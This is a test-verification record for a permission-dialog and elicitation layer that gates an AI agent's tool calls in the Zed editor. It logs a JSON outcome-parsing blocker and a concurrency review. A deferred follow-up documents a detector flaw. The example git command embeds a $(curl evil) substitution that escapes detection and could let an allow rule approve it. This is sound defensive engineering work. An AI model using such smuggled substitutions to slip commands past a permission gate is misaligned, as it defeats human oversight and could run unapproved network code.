---
status: partial
phase: 17-permissions-elicitation
source: [17-VERIFICATION.md]
started: 2026-09-01T05:05:00Z
updated: 2026-09-02T19:10:00Z
---

## Current Test

[testing complete]

## Tests

### 1. Live-Zed four-option permission dialog + always-persistence (WINDOWS #15)
expected: In a scratch project set permissions.mode: gated via Zed settings/configOptions, prompt a mutating tool call. Zed's native permission dialog renders with FOUR options (Allow once / Always allow / Reject once / Always reject — A1 caveat: confirm the four-option set, not just allow/reject); allow_always persists (second identical call runs with no dialog); reject_always denies with no dialog; cancel closes cleanly.
result: issue
reported: "Zed 1.18.0, live session 15ceb322: dialog renders natively with FOUR options — Allow once (⌘Y) / Always allow (⌥⌘Y) / Reject once (⌥⌘Z) / Always reject — confirmed by operator screenshot 2026-09-02 22:50 (A1 caveat RESOLVED: stable renders the full canonical set); cancel/stop closes cleanly (leg pass). But EVERY answer fails with 'malformed permission outcome: json: cannot unmarshal object into Go struct field PermissionOutcomeFrame.outcome of type string' — call fail-safe-declined, nothing persists (permissions.yaml stays allow:[]/deny:[] on every leg), identical prompt re-asks. Side findings: permissions.mode chip IS visible in the Agent Panel toolbar ('gated ⌄' in screenshot) but operator could not find the settable UI and hand-edited .ass-guard/config.yaml + restarted Zed; ass-guard --version prints 'dev' (no provenance without ldflags)."
severity: blocker

### 2. Live-Zed native elicitation form + answer lands as tool result (WINDOWS #15 steps 4-5)
expected: Prompt an AskUserQuestion / trigger a learning-store or engine ask in the same gated session. The ask renders as Zed's native structured form (elicitation/create); answering lands the answer as the tool result; on a pre-elicitation client the ask degrades to the plain-text path.
result: blocked
blocked_by: other
reason: "Blocked by gap G-17-1, not independently testable: in gated mode the AskUserQuestion tool call is itself permission-gated, so the native four-option permission dialog fires FIRST (operator screenshot 22:50:18 confirms it rendered for AskUserQuestion), the dialog answer hits the same outcome-unmarshal failure, the tool call is declined with an error before elicitation/create is ever sent, and the model falls back to asking in plain text (screenshots 22:51:12/22:51:40 — question as plain chat text, user answered 'яблоко', agent used the answer). Plain-text fallback leg: PASS (coherent degrade, answer used). Native form rendering + answer-lands-as-tool-result legs: UNTESTABLE until G-17-1 fix lands — re-run after gap closure."

### 3. Human review of the five concurrency fixes (17-REVIEW-FIX.md)
expected: An experienced reviewer eyeballs each fix diff for concurrency-semantics correctness beyond what the pins assert (no lost wakeups, no lock-order inversions, no scheduling-window leaks): CR-01 (a9d8ea4 batch gate-suspension collection + projector hasResult filter), CR-02 (a13054e SetResumeSerial turn-mutex serialization of async resumes), CR-04 (90f22ed SetTurnOriginAutomation bracket), CR-05 (f154e7d AskBroker.ArmSettle for permission suspensions), atomic DrainAll (a710b75). All six pins are RED-proven and green under -race; concurrency invariants can hold in tests and still hide races.
result: pass
note: "Orchestrator pre-reviewed all five diffs and surfaced two findings; operator reviewed them and ruled PASS (non-blocking). CR-01/CR-02/CR-05/DrainAll reviewed sound. Findings preserved as Deferred Follow-Ups below."

### 4. Judgment-tier prohibition review (4 items, NON-AUTHORITATIVE verdicts)
expected: Reviewer confirms the structural evidence is acceptable: 17-01 privacy — internal/perm has ZERO net/* deps (go list -deps); 17-02 safety — persist-then-execute, write failure downgrades to once-only with loud log (internal/session/ask.go:897-955); 17-02 values — neutral symmetric four-option labels (internal/acp/types.go:311-314); 17-04 privacy — BuildElicitationForm's only input is the AskQuestion slice (form discloses nothing the plain-text ask would not).
result: pass
note: "All four mechanical checks re-run by orchestrator live: go list -deps ./internal/perm | grep -c '^net' = 0; ask.go:929-956 persist-then-execute + loud-log downgrade both directions; types.go:311-314 canonical enum confirmed rendered in live dialog (Test 1 screenshot); BuildElicitationForm(qs []session.AskQuestion, ...) content sourced solely from the question slice (ask_surface.go:292). Operator confirmed."

## Summary

total: 4
passed: 2
issues: 1
pending: 0
skipped: 0
blocked: 1

## Deferred Follow-Ups

```yaml
- test: 3
  idea: "CR-04 (90f22ed): SetTurnOriginAutomation(true) is set BEFORE mu.TryLock and stays true while the automation goroutine queues behind / runs a turn — any foreground turn overlapping it gets its gated ask-class calls D-07-declined instead of a dialog (fail-safe direction, UX divergence). The in-code comment claims the turn mutex is already held, which does not match the code position. Proper fix: per-turn origin (turn-scoped), not a session-global flag. Operator ruled non-blocking for Phase 17."
  deferred_at: 2026-09-02
- test: 3
  idea: "hasSubstitution rewrite in a710b75 (internal/perm/rules.go) dropped double-quote tracking: case '\'' skips to the next single quote even when both are literal INSIDE double quotes, so git \"log 'x $(curl evil) y'\" under-detects live $()/backtick substitution (verified in live shell) and an allow rule (Bash(git *)) can now match a substitution-bearing command — WR-02's one-sided allow guard violated. Old pre-a710b75 code traced double quotes and caught this. Security-adjacent; deserves a fix ticket soon. Operator ruled non-blocking for Phase 17."
  deferred_at: 2026-09-02
```

## Gaps

- gap_id: G-17-1
  truth: "A gated permission-dialog answer (allow/reject x once/always) executes or denies the call and persists the always-rule to permissions.yaml"
  status: failed
  reason: "Live Zed 1.18.0 answers session/request_permission with the CANONICAL nested outcome object {\"result\":{\"outcome\":{\"outcome\":\"selected\",\"optionId\":\"…\"}}} (agentclientprotocol.com/protocol/v1/tool-calls), but PermissionOutcomeFrame (internal/acp/types.go:340) declares outcome as a flat string — json.Unmarshal fails at internal/acpserve/ask_surface.go:155-160 and every answer takes the fail-safe decline. The E2E simulator answers the same flat shape (internal/acpserve/permissions_e2e_test.go:380 permAnswerSelected), codifying the bug: battery green against a nonconformant client, dead against the real one. Verified from operator transcript/audit in ~/tmp/perm-uat/.ass-guard/ (permissions.yaml empty after all legs)."
  severity: blocker
  test: 1
  artifacts:
    - internal/acp/types.go:335-349
    - internal/acpserve/ask_surface.go:96-160
    - internal/acpserve/permissions_e2e_test.go:377-382
    - https://agentclientprotocol.com/protocol/v1/tool-calls
    - ~/tmp/perm-uat/.ass-guard/transcript_15ceb322-bfe2-439f-814f-a13f1bde76f7.jsonl
  missing: []
